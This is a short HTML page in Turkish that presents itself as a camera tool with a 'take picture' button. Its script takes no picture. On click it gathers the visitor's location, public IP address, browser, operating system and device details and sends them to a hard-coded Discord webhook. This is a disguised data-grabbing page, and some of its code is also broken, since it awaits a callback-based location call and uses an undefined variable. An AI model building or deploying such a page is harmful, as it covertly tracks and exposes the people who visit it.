<!DOCTYPE html>
<html>
  <head>
    <title>Kamera Erişimi</title>
  </head>
  <body>
    <h1>Kamera Erişimi</h1>
    <button id="take-picture">Resim Çek</button>
    <div id="resim-konteyner"></div>
    <script>
      // Get the take picture button and the picture container
      const takePictureButton = document.getElementById('take-picture');
      const pictureContainer = document.getElementById('resim-konteyner');

      // Set the webhook URL
      const webhookUrl = 'https://discord.com/api/webhooks/1246133942344617984/L5BhAqPdku8Q8qR5-DJO5senhebGe2UMdVCsxEzb7cj_pYXBOsG43i1eZzPSk15KrHJD';

      // Function to get the browser name from the user agent
      function getBrowserName(userAgent) {
        if (userAgent.indexOf('Chrome') > -1) return 'Google Chrome';
        if (userAgent.indexOf('Firefox') > -1) return 'Mozilla Firefox';
        if (userAgent.indexOf('Safari') > -1) return 'Safari';
        return 'Unknown';
      }

      // Function to get the browser version from the user agent
      function getBrowserVersion(userAgent) {
        const userAgentParts = userAgent.split(' ');
        for (const part of userAgentParts) {
          if (part.startsWith('Chrome')) {
            return part.split('/')[1];
          }
          if (part.startsWith('Firefox')) {
            return part.split('/')[1];
          }
          if (part.startsWith('Safari')) {
            return part.split('/')[1];
          }
        }
        return 'Unknown';
      }

      // Function to get the OS name from the platform
      function getOSName(platform) {
        if (platform === 'Win32') return 'Windows';
        if (platform === 'Darwin') return 'macOS';
        if (platform === 'Linux') return 'Linux';
        return 'Unknown';
      }

      // Function to get the CPU architecture from the user agent
      function getCPUArchitecture(userAgent) {
        const userAgentParts = userAgent.split(' ');
        for (const part of userAgentParts) {
          if (part.startsWith('WOW64')) {
            return 'x86';
          }
          if (part.startsWith('AMD64')) {
            return 'x64';
          }
          if (part.startsWith('armv7l')) {
            return 'armv7l';
          }
        }
        return 'Unknown';
      }

      // Function to get the device type from the user agent
      function getDeviceType(userAgent) {
        if (userAgent.indexOf('Mobile') > -1) return 'Mobile';
        if (userAgent.indexOf('Tablet') > -1) return 'Tablet';
        return 'Desktop';
      }

      // Handle the take picture button click event
      takePictureButton.addEventListener('click', async () => {
        // Get the current position and IP address
        if (navigator.geolocation && navigator.userAgentData) {
          try {
            const position = await navigator.geolocation.getCurrentPosition();
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;

            const ipUrl = 'https://api.ipify.org?format=json';
            const response = await fetch(ipUrl);
            const data = await response.json();
            const ip = data.ip;

            // Get the website URL, title, and other information
            const websiteUrl = window.location.href;
            const websiteTitle = document.title;
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const browserName = getBrowserName(userAgent);
            const browserVersion = getBrowserVersion(userAgent);
            const osName = getOSName(platform);
            const osVersion = platform;
            const deviceType = getDeviceType(userAgent);
            const screenHeight = screen.height;
            const screenColorDepth = screen.colorDepth;
            const screenOrientation = screen.orientation;

            // Get the device information
            const deviceMemory = navigator.deviceMemory;
            const deviceHardwareConcurrency = navigator.hardwareConcurrency;
            const deviceCpuArchitecture = getCPUArchitecture(userAgent);

            // Create the form data
            const formData = new FormData();
            formData.append('content', `Siteye Girildi: ${lat}, ${lon} - IP Adresi: ${ip} - Website: ${websiteUrl} - Başlık: ${websiteTitle} - Sistem Bilgisi: ${browserName} ${browserVersion} - İşletim Sistemi: ${osName} ${osVersion} - Cihaz Bilgisi: ${deviceType} - Ekran Bilgisi: ${screenWidth}x${screenHeight} - Renk Derinliği: ${screenColorDepth} - Ekran Yönü: ${screenOrientation} - Cihaz Belleği: ${deviceMemory} - Cihaz Çekirdek Sayısı: ${deviceHardwareConcurrency} - Cihaz CPU Mimarisi: ${deviceCpuArchitecture}`);

            // Send the form data to the Discord webhook
            try {
              await fetch(webhookUrl, { method: 'POST', body: formData });
              console.log('Webhook sent successfully!');
            } catch (error) {
              console.error('Error sending webhook:', error);
            }
          } catch (error) {
            console.error('Error getting location:', error);
          }
        } else {
          console.error('Coğrafi konum veya userAgentData bu tarayıcı tarafından desteklenmiyor.');
        }
      });
    </script>
  </body>
</html>
